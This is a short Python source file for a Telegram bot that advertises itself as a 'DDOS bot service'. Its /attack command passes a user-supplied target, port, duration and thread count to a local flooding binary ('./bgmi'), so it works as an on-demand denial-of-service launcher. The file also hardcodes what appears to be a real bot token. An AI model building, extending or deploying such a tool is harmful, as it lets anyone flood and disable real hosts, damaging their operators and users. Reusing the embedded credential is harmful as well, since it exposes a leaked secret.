import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define a command handler function
async def start(update: Update, context: CallbackContext) -> None:
    welcome_message = "Welcome, thanks for using our DDOS bot service! Type /attack to start further."
    await update.message.reply_text(welcome_message)

async def attack(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Usage: /attack <Target> <Port> <Time(s)> <Threads>")
        return
    target, port, time, threads = args
    # Assuming 'bgmi' is in the same directory as bot.py
    command = f"./bgmi {target} {port} {time} {threads}"
    import subprocess
    result = subprocess.run(command.split(), stdout=subprocess.PIPE)
    await update.message.reply_text(result.stdout.decode('utf-8'))

def main():
    # Replace 'YOUR TOKEN HERE' with your bot's token
    application = Application.builder().token("7382672859:AAEHvpygRw_Rmz0mJAAIloNlyzr6G2miPcE").build()

    # on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    # Start the Bot
    application.run_polling()

if __name__ == '__main__':
    main()
